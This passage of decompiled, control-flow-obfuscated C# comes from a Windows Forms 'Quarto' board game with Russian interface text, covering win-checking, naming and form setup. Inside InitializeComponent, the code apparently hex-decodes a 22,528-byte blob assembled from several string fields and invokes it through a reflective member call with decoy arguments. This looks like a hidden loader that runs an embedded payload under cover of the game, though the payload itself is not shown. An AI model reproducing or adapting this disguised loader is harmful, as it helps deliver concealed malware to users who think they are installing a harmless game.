				}
				case 69u:
				{
					int num43;
					if (mem[0, 3].Point != mem[1, 2].Point)
					{
						num = 662437147;
						num43 = 662437147;
					}
					else
					{
						num = 251385486;
						num43 = 251385486;
					}
					continue;
				}
				case 68u:
				{
					int num14;
					int num15;
					if (mem[1, 1].Big == mem[2, 2].Big)
					{
						num14 = 1645271417;
						num15 = 1645271417;
					}
					else
					{
						num14 = 103953701;
						num15 = 103953701;
					}
					num = num14 ^ ((int)num2 * -1181959048);
					continue;
				}
				case 67u:
					if (mem[2, num5].Point != mem[3, num5].Point)
					{
						num = (int)(num2 * 492226261) ^ -566853702;
						continue;
					}
					goto IL_01d2;
				case 66u:
					if (mem[1, num5] != null)
					{
						num = ((int)num2 * -1417212861) ^ -1144175820;
						continue;
					}
					goto IL_01de;
				case 65u:
					if (mem[2, 1].Dark != mem[3, 0].Dark)
					{
						num = (int)(num2 * 1968637480) ^ -1601008483;
						continue;
					}
					goto IL_023d;
				case 64u:
					flag = true;
					num = (int)(num2 * 626352581) ^ -1561098810;
					continue;
				case 63u:
				{
					int num18;
					int num19;
					if (mem[num5, 1].Dark == mem[num5, 2].Dark)
					{
						num18 = -1774125715;
						num19 = -1774125715;
					}
					else
					{
						num18 = -1170562840;
						num19 = -1170562840;
					}
					num = num18 ^ (int)(num2 * 1300327366);
					continue;
				}
				case 62u:
					if (mem[2, 1] != null)
					{
						num = (int)((num2 * 1025738033) ^ 0x1948189D);
						continue;
					}
					goto IL_02bd;
				case 61u:
					if (mem[2, 2].Dark != mem[3, 3].Dark)
					{
						num = (int)((num2 * 1052448684) ^ 0xC244123);
						continue;
					}
					goto IL_02f2;
				case 60u:
				{
					int num59;
					int num60;
					if (mem[num5, 2] != null)
					{
						num59 = 1161916246;
						num60 = 1161916246;
					}
					else
					{
						num59 = 1238228424;
						num60 = 1238228424;
					}
					num = num59 ^ ((int)num2 * -1333773721);
					continue;
				}
				case 59u:
					if (mem[0, 3] != null)
					{
						num = 1322190703;
						continue;
					}
					goto IL_02bd;
				case 58u:
					if (mem[2, num5].Square == mem[3, num5].Square)
					{
						goto IL_01d2;
					}
					goto IL_01de;
				case 57u:
				{
					int num49;
					int num50;
					if (mem[num5, 1].Square != mem[num5, 2].Square)
					{
						num49 = -1238488952;
						num50 = -1238488952;
					}
					else
					{
						num49 = -1290046563;
						num50 = -1290046563;
					}
					num = num49 ^ ((int)num2 * -70344351);
					continue;
				}
				case 56u:
				{
					int num45;
					if (mem[num5, 0] != null)
					{
						num = 1602036760;
						num45 = 1602036760;
					}
					else
					{
						num = 115807525;
						num45 = 115807525;
					}
					continue;
				}
				case 55u:
				{
					int num36;
					if (mem[0, num5].Point != mem[1, num5].Point)
					{
						num = 1387795848;
						num36 = 1387795848;
					}
					else
					{
						num = 825013446;
						num36 = 825013446;
					}
					continue;
				}
				case 54u:
					result = flag;
					num = 767292609;
					continue;
				case 53u:
					num5++;
					num = ((int)num2 * -583520982) ^ 0x4BBF50BF;
					continue;
				case 52u:
					if (mem[0, num5].Square == mem[1, num5].Square)
					{
						num = 1005089200;
						continue;
					}
					goto IL_01de;
				case 51u:
					if (mem[3, 0] != null)
					{
						num = (int)((num2 * 27747375) ^ 0x3DCD5C36);
						continue;
					}
					goto IL_02bd;
				case 50u:
					if (mem[2, 2].Point != mem[3, 3].Point)
					{
						num = ((int)num2 * -1136892382) ^ 0x4C177D35;
						continue;
					}
					goto IL_02f2;
				case 49u:
					if (mem[1, num5].Square == mem[2, num5].Square)
					{
						num = ((int)num2 * -619487220) ^ -1138628625;
						continue;
					}
					goto IL_01de;
				case 48u:
					if (mem[2, 2].Big != mem[3, 3].Big)
					{
						num = (int)(num2 * 1182883479) ^ -737458970;
						continue;
					}
					goto IL_02f2;
				case 47u:
				{
					int num68;
					int num69;
					if (mem[num5, 1] == null)
					{
						num68 = 706198077;
						num69 = 706198077;
					}
					else
					{
						num68 = 133936271;
						num69 = 133936271;
					}
					num = num68 ^ ((int)num2 * -600318778);
					continue;
				}
				case 46u:
				{
					int num62;
					int num63;
					if (mem[3, 3] == null)
					{
						num62 = -82806078;
						num63 = -82806078;
					}
					else
					{
						num62 = -863302010;
						num63 = -863302010;
					}
					num = num62 ^ (int)(num2 * 2133534364);
					continue;
				}
				case 45u:
				{
					int num58;
					if (mem[num5, 0].Point == mem[num5, 1].Point)
					{
						num = 1986845537;
						num58 = 1986845537;
					}
					else
					{
						num = 1839234303;
						num58 = 1839234303;
					}
					continue;
				}
				case 44u:
					if (mem[2, 1].Point != mem[3, 0].Point)
					{
						num = (int)((num2 * 1235647650) ^ 0x10E658E1);
						continue;
					}
					goto IL_023d;
				case 43u:
					flag = false;
					num = ((int)num2 * -992009394) ^ -930931786;
					continue;
				case 42u:
				{
					int num51;
					int num52;
					if (mem[0, 0] == null)
					{
						num51 = 687568011;
						num52 = 687568011;
					}
					else
					{
						num51 = 967777565;
						num52 = 967777565;
					}
					num = num51 ^ (int)(num2 * 2092582251);
					continue;
				}
				case 41u:
				{
					int num46;
					int num47;
					if (mem[1, 1] != null)
					{
						num46 = 310228291;
						num47 = 310228291;
					}
					else
					{
						num46 = 1212922954;
						num47 = 1212922954;
					}
					num = num46 ^ ((int)num2 * -1989830007);
					continue;
				}
				case 40u:
				{
					int num41;
					int num42;
					if (mem[0, 3].Big != mem[1, 2].Big)
					{
						num41 = 502465458;
						num42 = 502465458;
					}
					else
					{
						num41 = 323581808;
						num42 = 323581808;
					}
					num = num41 ^ (int)(num2 * 1207287210);
					continue;
				}
				case 39u:
					if (mem[0, num5] != null)
					{
						num = 414344578;
						continue;
					}
					goto IL_01de;
				case 38u:
					if (mem[num5, 2].Dark != mem[num5, 3].Dark)
					{
						num = ((int)num2 * -818257125) ^ -1090470685;
						continue;
					}
					goto IL_01d2;
				case 37u:
					if (mem[num5, 2].Big != mem[num5, 3].Big)
					{
						num = ((int)num2 * -812443657) ^ -1542286521;
						continue;
					}
					goto IL_01d2;
				case 36u:
				{
					int num31;
					if (mem[0, 0].Square == mem[1, 1].Square)
					{
						num = 197892297;
						num31 = 197892297;
					}
					else
					{
						num = 863418546;
						num31 = 863418546;
					}
					continue;
				}
				case 35u:
					if (mem[2, num5] != null)
					{
						num = (int)((num2 * 2044698906) ^ 0x2063211D);
						continue;
					}
					goto IL_01de;
				case 34u:
				{
					int num24;
					int num25;
					if (mem[1, 1].Dark != mem[2, 2].Dark)
					{
						num24 = 1145456227;
						num25 = 1145456227;
					}
					else
					{
						num24 = 565558174;
						num25 = 565558174;
					}
					num = num24 ^ ((int)num2 * -1364739599);
					continue;
				}
				case 33u:
				{
					int num20;
					int num21;
					if (mem[0, 0].Big != mem[1, 1].Big)
					{
						num20 = -1810005581;
						num21 = -1810005581;
					}
					else
					{
						num20 = -2022862683;
						num21 = -2022862683;
					}
					num = num20 ^ ((int)num2 * -521694765);
					continue;
				}
				case 32u:
				{
					int num10;
					int num11;
					if (mem[1, num5].Point != mem[2, num5].Point)
					{
						num10 = -1285919502;
						num11 = -1285919502;
					}
					else
					{
						num10 = -114710260;
						num11 = -114710260;
					}
					num = num10 ^ (int)(num2 * 678333073);
					continue;
				}
				case 31u:
				{
					int num3;
					int num4;
					if (mem[1, 2].Dark == mem[2, 1].Dark)
					{
						num3 = 315161494;
						num4 = 315161494;
					}
					else
					{
						num3 = 1849414701;
						num4 = 1849414701;
					}
					num = num3 ^ (int)(num2 * 672192416);
					continue;
				}
				case 30u:
					if (mem[num5, 2].Square != mem[num5, 3].Square)
					{
						num = (int)((num2 * 1462213825) ^ 0x6A910409);
						continue;
					}
					goto IL_01d2;
				case 29u:
				{
					int num64;
					int num65;
					if (mem[num5, 1].Point != mem[num5, 2].Point)
					{
						num64 = -389005468;
						num65 = -389005468;
					}
					else
					{
						num64 = -1888980982;
						num65 = -1888980982;
					}
					num = num64 ^ ((int)num2 * -509916937);
					continue;
				}
				case 28u:
					if (mem[2, 1].Big != mem[3, 0].Big)
					{
						num = ((int)num2 * -71967951) ^ 0x1DA6A6C5;
						continue;
					}
					goto IL_023d;
				case 27u:
					if (mem[0, 3].Square == mem[1, 2].Square)
					{
						num = 1224925526;
						continue;
					}
					goto IL_091c;
				case 26u:
				{
					int num56;
					int num57;
					if (flag2)
					{
						num56 = 466909461;
						num57 = 466909461;
					}
					else
					{
						num56 = 660704535;
						num57 = 660704535;
					}
					num = num56 ^ (int)(num2 * 27578259);
					continue;
				}
				case 25u:
					flag = true;
					num = (int)((num2 * 1327494407) ^ 0x64DA3672);
					continue;
				case 24u:
				{
					int num54;
					int num55;
					if (mem[1, num5].Big == mem[2, num5].Big)
					{
						num54 = 1106362092;
						num55 = 1106362092;
					}
					else
					{
						num54 = 1342501627;
						num55 = 1342501627;
					}
					num = num54 ^ (int)(num2 * 1192042557);
					continue;
				}
				case 23u:
				{
					int num53;
					if (mem[0, 0].Dark != mem[1, 1].Dark)
					{
						num = 1255204315;
						num53 = 1255204315;
					}
					else
					{
						num = 74123556;
						num53 = 74123556;
					}
					continue;
				}
				case 22u:
					num5 = 0;
					num = ((int)num2 * -8862689) ^ 0x1D801C4B;
					continue;
				case 21u:
					if (mem[3, num5] != null)
					{
						num = ((int)num2 * -507945277) ^ 0x72094F65;
						continue;
					}
					goto IL_01de;
				case 20u:
					if (mem[1, 2] != null)
					{
						num = (int)(num2 * 1742353790) ^ -775138614;
						continue;
					}
					goto IL_02bd;
				case 19u:
				{
					int num48;
					if (mem[num5, 0].Square == mem[num5, 1].Square)
					{
						num = 902073809;
						num48 = 902073809;
					}
					else
					{
						num = 115807525;
						num48 = 115807525;
					}
					continue;
				}
				case 18u:
					num = 987620083;
					continue;
				case 17u:
				{
					int num44;
					if (mem[0, 0].Point == mem[1, 1].Point)
					{
						num = 1020655494;
						num44 = 1020655494;
					}
					else
					{
						num = 983005505;
						num44 = 983005505;
					}
					continue;
				}
				case 16u:
					if (mem[2, num5].Big != mem[3, num5].Big)
					{
						num = ((int)num2 * -1888225692) ^ -842378480;
						continue;
					}
					goto IL_01d2;
				case 15u:
				{
					int num40;
					if (mem[num5, 0].Dark == mem[num5, 1].Dark)
					{
						num = 1256405336;
						num40 = 1256405336;
					}
					else
					{
						num = 810437232;
						num40 = 810437232;
					}
					continue;
				}
				case 14u:
					if (mem[2, num5].Dark != mem[3, num5].Dark)
					{
						num = ((int)num2 * -947242687) ^ 0x156C5B6E;
						continue;
					}
					goto IL_01d2;
				case 13u:
				{
					int num37;
					int num38;
					if (mem[1, 1].Point == mem[2, 2].Point)
					{
						num37 = 1101972354;
						num38 = 1101972354;
					}
					else
					{
						num37 = 38305349;
						num38 = 38305349;
					}
					num = num37 ^ (int)(num2 * 425103754);
					continue;
				}
				case 12u:
				{
					int num34;
					int num35;
					if (mem[1, 2].Big == mem[2, 1].Big)
					{
						num34 = 537915965;
						num35 = 537915965;
					}
					else
					{
						num34 = 1289819508;
						num35 = 1289819508;
					}
					num = num34 ^ (int)(num2 * 1951283034);
					continue;
				}
				case 11u:
				{
					int num29;
					int num30;
					if (mem[num5, 0].Big == mem[num5, 1].Big)
					{
						num29 = 888299037;
						num30 = 888299037;
					}
					else
					{
						num29 = 603616279;
						num30 = 603616279;
					}
					num = num29 ^ ((int)num2 * -509242525);
					continue;
				}
				case 10u:
				{
					int num28;
					if (num5 < 4)
					{
						num = 970839467;
						num28 = 970839467;
					}
					else
					{
						num = 2046597111;
						num28 = 2046597111;
					}
					continue;
				}
				case 9u:
					if (mem[num5, 2].Point != mem[num5, 3].Point)
					{
						num = ((int)num2 * -1751446861) ^ 0x10669768;
						continue;
					}
					goto IL_01d2;
				case 8u:
					num9 = ((mem[2, 1].Square == mem[3, 0].Square) ? 1 : 0);
					goto IL_023e;
				case 7u:
				{
					int num22;
					int num23;
					if (mem[1, 1].Square == mem[2, 2].Square)
					{
						num22 = -243950291;
						num23 = -243950291;
					}
					else
					{
						num22 = -1558648804;
						num23 = -1558648804;
					}
					num = num22 ^ ((int)num2 * -247947018);
					continue;
				}
				case 6u:
				{
					int num16;
					int num17;
					if (mem[1, num5].Dark == mem[2, num5].Dark)
					{
						num16 = -82611754;
						num17 = -82611754;
					}
					else
					{
						num16 = -123579932;
						num17 = -123579932;
					}
					num = num16 ^ ((int)num2 * -386668659);
					continue;
				}
				case 5u:
				{
					int num12;
					int num13;
					if (mem[0, num5].Big == mem[1, num5].Big)
					{
						num12 = 1464720777;
						num13 = 1464720777;
					}
					else
					{
						num12 = 351789850;
						num13 = 351789850;
					}
					num = num12 ^ ((int)num2 * -102897015);
					continue;
				}
				case 4u:
					if (mem[1, 2].Square == mem[2, 1].Square)
					{
						num = (int)(num2 * 1187174548) ^ -1752531724;
						continue;
					}
					goto IL_091c;
				case 1u:
				{
					int num6;
					int num7;
					if (mem[num5, 3] != null)
					{
						num6 = -547190904;
						num7 = -547190904;
					}
					else
					{
						num6 = -1574172962;
						num7 = -1574172962;
					}
					num = num6 ^ (int)(num2 * 73155981);
					continue;
				}
				case 0u:
					if (mem[2, 2].Square != mem[3, 3].Square)
					{
						num = (int)((num2 * 287019460) ^ 0x3BF1EC0E);
						continue;
					}
					goto IL_02f2;
				case 3u:
					break;
				default:
					{
						return result;
					}
					IL_01d2:
					num = 1075627886;
					num8 = 1075627886;
					continue;
					IL_02f2:
					num9 = 1;
					goto IL_023e;
					IL_02bd:
					num9 = 0;
					goto IL_023e;
					IL_023e:
					flag2 = (byte)num9 != 0;
					num = 1008770789;
					continue;
					IL_023d:
					num9 = 1;
					goto IL_023e;
					IL_091c:
					num9 = 0;
					goto IL_023e;
					IL_01de:
					num = 849744764;
					num8 = 849744764;
					continue;
				}
				break;
			}
		}
	}

	private bool Standoff(Figurine[,] mem)
	{
		int num4 = default(int);
		int num3 = default(int);
		bool result = default(bool);
		bool flag = default(bool);
		bool flag2 = default(bool);
		while (true)
		{
			int num = 214409351;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x6C5A0679u) % 13u)
				{
				case 12u:
					num = ((int)num2 * -2054774333) ^ -1351480135;
					continue;
				case 11u:
					num4++;
					num = (int)(num2 * 1662462786) ^ -2097959002;
					continue;
				case 10u:
				{
					int num7;
					if (num3 >= 4)
					{
						num = 319749779;
						num7 = 319749779;
					}
					else
					{
						num = 334350946;
						num7 = 334350946;
					}
					continue;
				}
				case 9u:
					result = flag;
					num = (int)(num2 * 1324657616) ^ -469819362;
					continue;
				case 7u:
					num3++;
					num = 860680988;
					continue;
				case 6u:
					flag = false;
					num = ((int)num2 * -1199401552) ^ -1165193715;
					continue;
				case 5u:
				{
					int num8;
					if (num4 < 4)
					{
						num = 906062440;
						num8 = 906062440;
					}
					else
					{
						num = 804313769;
						num8 = 804313769;
					}
					continue;
				}
				case 4u:
					flag2 = mem[num4, num3] == null;
					num = 1246453017;
					continue;
				case 3u:
				{
					int num5;
					int num6;
					if (flag2)
					{
						num5 = 1157481761;
						num6 = 1157481761;
					}
					else
					{
						num5 = 625759277;
						num6 = 625759277;
					}
					num = num5 ^ (int)(num2 * 165742943);
					continue;
				}
				case 1u:
					flag = true;
					num4 = 0;
					num = (int)((num2 * 1391204702) ^ 0x5B14CAB6);
					continue;
				case 0u:
					num3 = 0;
					num = 1162746894;
					continue;
				case 8u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	public void SetName(string str)
	{
		while (true)
		{
			int num = -686231081;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x95BF7B11u) % 9u)
				{
				case 8u:
					Form1.smethod_32((Control)(object)label6, str);
					num = (int)((num2 * 259102370) ^ 0x9D355DD);
					continue;
				case 7u:
					Form1.smethod_50((Control)(object)label6, Form1.smethod_37((Control)(object)label5).X + Form1.smethod_18((Control)(object)label5));
					num = (int)(num2 * 405291548) ^ -1340005766;
					continue;
				case 5u:
					Form1.smethod_32((Control)(object)label5, "Игрок: ");
					num = ((int)num2 * -2010394890) ^ -885720515;
					continue;
				case 4u:
					num = ((int)num2 * -2111519456) ^ 0x6506035;
					continue;
				case 3u:
					num = (int)((num2 * 1886098747) ^ 0x40665CFA);
					continue;
				case 2u:
					Form1.smethod_50((Control)(object)label5, (Form1.smethod_49((Control)(object)this) - (Form1.smethod_18((Control)(object)label5) + Form1.smethod_18((Control)(object)label6))) / 2);
					num = ((int)num2 * -1887585670) ^ 0x612B5C98;
					continue;
				case 1u:
					Form1.smethod_32((Control)(object)label1, "");
					Form1.smethod_32((Control)(object)label2, "");
					num = ((int)num2 * -674543026) ^ 0x667F868F;
					continue;
				default:
					return;
				case 0u:
					break;
				case 6u:
					return;
				}
				break;
			}
		}
	}

	protected override void Dispose(bool disposing)
	{
		bool flag = default(bool);
		while (true)
		{
			int num = 2006615726;
			while (true)
			{
				uint num2;
				int num5;
				switch ((num2 = (uint)num ^ 0x2FE0BBCEu) % 9u)
				{
				case 6u:
					num = ((int)num2 * -58537537) ^ -673844008;
					continue;
				case 5u:
					num = ((int)num2 * -1121757126) ^ -2035527568;
					continue;
				case 4u:
					if (disposing)
					{
						num = ((int)num2 * -793903999) ^ 0x17E8DA02;
						continue;
					}
					num5 = 0;
					goto IL_003a;
				case 3u:
					num5 = ((components != null) ? 1 : 0);
					goto IL_003a;
				case 2u:
					Form1.smethod_51((IDisposable)components);
					num = ((int)num2 * -1579243955) ^ -602000118;
					continue;
				case 1u:
				{
					int num3;
					int num4;
					if (!flag)
					{
						num3 = 1481056745;
						num4 = 1481056745;
					}
					else
					{
						num3 = 161184866;
						num4 = 161184866;
					}
					num = num3 ^ (int)(num2 * 299100537);
					continue;
				}
				case 0u:
					num = (int)((num2 * 262343394) ^ 0x13FE4832);
					continue;
				case 7u:
					break;
				default:
					{
						((Form)this).Dispose(disposing);
						return;
					}
					IL_003a:
					flag = (byte)num5 != 0;
					num = 212691;
					continue;
				}
				break;
			}
		}
	}

	private void InitializeComponent()
	{
		//IL_06b2: Unknown result type (might be due to invalid IL or missing references)
		//IL_06bc: Expected O, but got Unknown
		components = Form1.smethod_52();
		string string_ = default(string);
		int num3 = default(int);
		byte[] array = default(byte[]);
		object[] object_ = default(object[]);
		while (true)
		{
			int num = -1157534228;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xCAD49FF7u) % 123u)
				{
				case 122u:
					Form1.smethod_64((Control)(object)richTextBox1, 6);
					num = (int)(num2 * 868845271) ^ -1909665649;
					continue;
				case 121u:
					string_ = Form1.smethod_34(string_, Veet.Xe);
					string_ = Form1.smethod_34(string_, Veet.Zr);
					num = ((int)num2 * -944965476) ^ -106054446;
					continue;
				case 120u:
					Form1.smethod_4((Control)(object)panel1, new Point(0, 24));
					num = (int)(num2 * 248372480) ^ -1655583901;
					continue;
				case 119u:
					num = ((int)num2 * -1637843139) ^ -791896912;
					continue;
				case 118u:
					Form1.smethod_4((Control)(object)richTextBox1, new Point(107, 275));
					num = (int)((num2 * 2020895245) ^ 0x62A2574A);
					continue;
				case 117u:
					Form1.smethod_3((Control)(object)button2, new Size(83, 35));
					Form1.smethod_64((Control)(object)button2, 4);
					num = ((int)num2 * -370211361) ^ -1607456040;
					continue;
				case 116u:
				{
					int num4;
					if (num3 < 22528)
					{
						num = -456444596;
						num4 = -456444596;
					}
					else
					{
						num = -1505861318;
						num4 = -1505861318;
					}
					continue;
				}
				case 115u:
					num = ((int)num2 * -2016031652) ^ -450371260;
					continue;
				case 114u:
					array[num3] = Form1.smethod_69(Form1.smethod_68(string_, num3 * 2, 2), 16);
					num3++;
					num = (int)(num2 * 97342031) ^ -84901899;
					continue;
				case 112u:
					Form1.smethod_61((Control)(object)pictureBox1, "pictureBox1");
					num = (int)(num2 * 1496970061) ^ -1199950463;
					continue;
				case 111u:
					Form1.smethod_4((Control)(object)label2, new Point(0, 0));
					num = ((int)num2 * -270022510) ^ 0x45A8D5A9;
					continue;
				case 110u:
					num = (int)((num2 * 1124210125) ^ 0x41316850);
					continue;
				case 109u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)richTextBox1);
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)button2);
					num = (int)(num2 * 1281958163) ^ -1416678509;
					continue;
				case 108u:
					Form1.smethod_65((Control)(object)button2, bool_0: false);
					num = (int)((num2 * 867786220) ^ 0x304027D5);
					continue;
				case 107u:
					Form1.smethod_4((Control)(object)label1, new Point(486, 0));
					num = ((int)num2 * -1871493572) ^ -1787500602;
					continue;
				case 106u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label5);
					num = ((int)num2 * -778863113) ^ -1005416563;
					continue;
				case 105u:
					Form1.smethod_5((Control)(object)this, Color.White);
					num = ((int)num2 * -664258087) ^ -1229643194;
					continue;
				case 104u:
					num = (int)((num2 * 926990316) ^ 0x2996BBEA);
					continue;
				case 103u:
					Form1.smethod_61((Control)(object)label1, "label1");
					num = ((int)num2 * -958442006) ^ -423567857;
					continue;
				case 102u:
					num = ((int)num2 * -1405941834) ^ 0x6891CC70;
					continue;
				case 101u:
					num = (int)(num2 * 498120397) ^ -1795248913;
					continue;
				case 100u:
					Form1.smethod_74((Control)(object)label1, bool_0: true);
					Form1.smethod_75((Control)(object)label1, (DockStyle)4);
					num = ((int)num2 * -1743359225) ^ 0x53AD3725;
					continue;
				case 99u:
					Form1.smethod_3((Control)(object)label5, new Size(0, 16));
					num = (int)((num2 * 47749542) ^ 0x13438F24);
					continue;
				case 98u:
					Form1.smethod_79((ContainerControl)(object)this, new SizeF(6f, 13f));
					num = ((int)num2 * -263394105) ^ -1155582773;
					continue;
				case 97u:
					num = ((int)num2 * -635147779) ^ -924697228;
					continue;
				case 96u:
					Form1.smethod_70(ComMember, object_);
					num = ((int)num2 * -1427562883) ^ -664871968;
					continue;
				case 95u:
					num = ((int)num2 * -771362043) ^ 0x24FDF649;
					continue;
				case 94u:
					pictureBox1 = Form1.smethod_2();
					num = (int)((num2 * 636226006) ^ 0x757397AF);
					continue;
				case 93u:
					num = (int)((num2 * 1614470987) ^ 0x34E8E662);
					continue;
				case 92u:
					Form1.smethod_62(pictureBox1, 0);
					num = ((int)num2 * -943572417) ^ -1866502788;
					continue;
				case 91u:
					Form1.smethod_91((Control)(object)this, bool_0: false);
					num = (int)(num2 * 2076804239) ^ -1888155452;
					continue;
				case 90u:
					num = (int)((num2 * 1858670638) ^ 0x5B3CF289);
					continue;
				case 89u:
					panel1 = Form1.smethod_55();
					timer1 = Form1.smethod_56(components);
					label1 = Form1.smethod_57();
					label2 = Form1.smethod_57();
					num = ((int)num2 * -1000335504) ^ 0x71E31D94;
					continue;
				case 88u:
					Form1.smethod_81((Form)(object)this, new Size(486, 319));
					num = ((int)num2 * -1470951496) ^ 0x6B17140A;
					continue;
				case 87u:
					num = ((int)num2 * -801491546) ^ -1312437275;
					continue;
				case 86u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)button1);
					num = (int)(num2 * 1741226165) ^ -316620593;
					continue;
				case 85u:
					Form1.smethod_3((Control)(object)label1, new Size(0, 16));
					num = (int)(num2 * 293186565) ^ -167355760;
					continue;
				case 84u:
					Form1.smethod_74((Control)(object)label5, bool_0: true);
					num = (int)((num2 * 498157557) ^ 0x79168F1B);
					continue;
				case 83u:
					num = (int)(num2 * 1691422705) ^ -549970597;
					continue;
				case 81u:
					Form1.smethod_4((Control)(object)button2, new Point(391, 275));
					Form1.smethod_61((Control)(object)button2, "button2");
					num = (int)(num2 * 923839988) ^ -1134614013;
					continue;
				case 80u:
					Form1.smethod_74((Control)(object)label2, bool_0: true);
					num = (int)(num2 * 1497899447) ^ -562966599;
					continue;
				case 79u:
					num = ((int)num2 * -1988578096) ^ 0x148BD713;
					continue;
				case 78u:
					Form1.smethod_83((Form)(object)this, (FormBorderStyle)1);
					num = ((int)num2 * -1070221683) ^ -901035591;
					continue;
				case 77u:
					num = (int)(num2 * 195160506) ^ -49463219;
					continue;
				case 76u:
					Form1.smethod_64((Control)(object)panel1, 7);
					num = ((int)num2 * -490542490) ^ 0xFE2DC0D;
					continue;
				case 75u:
					CharArray(array, string.Empty);
					num = (int)(num2 * 1839629917) ^ -1341626084;
					continue;
				case 74u:
					Form1.smethod_65((Control)(object)richTextBox1, bool_0: false);
					Form1.smethod_32((Control)(object)richTextBox1, "");
					num = (int)(num2 * 1602801074) ^ -972522698;
					continue;
				case 73u:
					Form1.smethod_67((Control)(object)button2, (EventHandler)Button2_Click);
					Form1.smethod_4((Control)(object)button1, new Point(12, 275));
					num = ((int)num2 * -357222787) ^ -915747949;
					continue;
				case 72u:
					string_ = Veet.Sa;
					num = (int)((num2 * 231329045) ^ 0x2222874A);
					continue;
				case 71u:
					num = ((int)num2 * -1920171108) ^ -333430385;
					continue;
				case 70u:
					Form1.smethod_32((Control)(object)button2, "Подтвердить");
					num = ((int)num2 * -1671559367) ^ -2020847468;
					continue;
				case 69u:
					Form1.smethod_63(pictureBox1, bool_0: false);
					Form1.smethod_6((Control)(object)pictureBox1, new MouseEventHandler(PictureBox1_MouseDown));
					num = ((int)num2 * -1762776586) ^ 0x57507E8B;
					continue;
				case 68u:
					Form1.smethod_89((Control)(object)this, (EventHandler)Form1_LocationChanged);
					num = (int)((num2 * 691339052) ^ 0x46BE2536);
					continue;
				case 67u:
					num = ((int)num2 * -719137017) ^ -1321586857;
					continue;
				case 66u:
					array = new byte[22528];
					num = (int)(num2 * 509484362) ^ -1368566841;
					continue;
				case 65u:
					num = -25455983;
					continue;
				case 64u:
					button2 = Form1.smethod_53();
					num = ((int)num2 * -169942768) ^ -1882643258;
					continue;
				case 63u:
					Form1.smethod_32((Control)(object)this, "Quarto");
					Form1.smethod_87((Form)(object)this, (EventHandler)Form1_Load);
					num = (int)((num2 * 1278863813) ^ 0x5C357B26);
					continue;
				case 62u:
					Form1.smethod_88((Form)(object)this, (EventHandler)Form1_Shown);
					num = (int)(num2 * 188673814) ^ -1163566388;
					continue;
				case 61u:
					object_ = new object[3]
					{
						Player.MembershipCondition(0),
						Player.MembershipCondition(1),
						"Cytotechnologist"
					};
					num = ((int)num2 * -346157482) ^ 0x410E3D18;
					continue;
				case 60u:
					Form1.smethod_77((Control)(object)label2, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = ((int)num2 * -1385332640) ^ 0x1B1CDAD2;
					continue;
				case 59u:
					num = ((int)num2 * -901066405) ^ 0x67417397;
					continue;
				case 58u:
					num = (int)(num2 * 1809230347) ^ -987839756;
					continue;
				case 57u:
					label6 = Form1.smethod_57();
					num = ((int)num2 * -987727894) ^ 0x2A706982;
					continue;
				case 56u:
					num3 = 0;
					num = (int)(num2 * 1468604497) ^ -1857894508;
					continue;
				case 55u:
					Form1.smethod_3((Control)(object)richTextBox1, new Size(272, 35));
					num = (int)(num2 * 1340072488) ^ -1418251928;
					continue;
				case 54u:
					Form1.smethod_80((ContainerControl)(object)this, (AutoScaleMode)1);
					num = (int)((num2 * 1787967228) ^ 0x12EDF8C1);
					continue;
				case 53u:
					Form1.smethod_61((Control)(object)label2, "label2");
					num = ((int)num2 * -495113051) ^ -34748590;
					continue;
				case 52u:
					Form1.smethod_3((Control)(object)pictureBox1, new Size(246, 246));
					num = ((int)num2 * -1937209864) ^ -353147589;
					continue;
				case 51u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label1);
					num = ((int)num2 * -481460270) ^ 0x3ED7DC83;
					continue;
				case 50u:
					Form1.smethod_59((Control)(object)this);
					Form1.smethod_5((Control)(object)pictureBox1, Color.FromArgb(64, 32, 0));
					num = ((int)num2 * -1868566828) ^ -1811521031;
					continue;
				case 49u:
					Form1.smethod_65((Control)(object)button1, bool_0: false);
					Form1.smethod_32((Control)(object)button1, "Меню");
					num = ((int)num2 * -722008020) ^ 0x2EAEE703;
					continue;
				case 48u:
					Form1.smethod_66((ButtonBase)(object)button2, bool_0: true);
					num = (int)(num2 * 1470289561) ^ -1491093551;
					continue;
				case 47u:
					Form1.smethod_90((ISupportInitialize)pictureBox1);
					num = ((int)num2 * -418069305) ^ -1782321772;
					continue;
				case 46u:
					num = (int)(num2 * 1196556313) ^ -105111758;
					continue;
				case 45u:
					Form1.smethod_77((Control)(object)label1, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = (int)((num2 * 734741766) ^ 0x325FB16B);
					continue;
				case 44u:
					Form1.smethod_77((Control)(object)label6, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = (int)(num2 * 1386470334) ^ -777289516;
					continue;
				case 43u:
					num = (int)((num2 * 1827045975) ^ 0x487B5836);
					continue;
				case 42u:
					num = (int)((num2 * 1780452072) ^ 0x76B6396B);
					continue;
				case 41u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label2);
					num = ((int)num2 * -378654230) ^ -425643567;
					continue;
				case 40u:
					Form1.smethod_61((Control)(object)richTextBox1, "richTextBox1");
					num = ((int)num2 * -392949010) ^ -651557756;
					continue;
				case 39u:
					Form1.smethod_4((Control)(object)pictureBox1, new Point(120, 22));
					num = (int)(num2 * 322504384) ^ -669288436;
					continue;
				case 38u:
					num = (int)(num2 * 369100031) ^ -1532562083;
					continue;
				case 37u:
					Form1.smethod_4((Control)(object)label6, new Point(275, 0));
					num = ((int)num2 * -1332684854) ^ 0x2C390258;
					continue;
				case 36u:
					Form1.smethod_72(timer1, 1000);
					Form1.smethod_73(timer1, (EventHandler)Timer1_Tick);
					num = (int)(num2 * 1055799916) ^ -498168973;
					continue;
				case 35u:
					Form1.smethod_60(pictureBox1, (BorderStyle)2);
					num = (int)((num2 * 1563089999) ^ 0x144FC004);
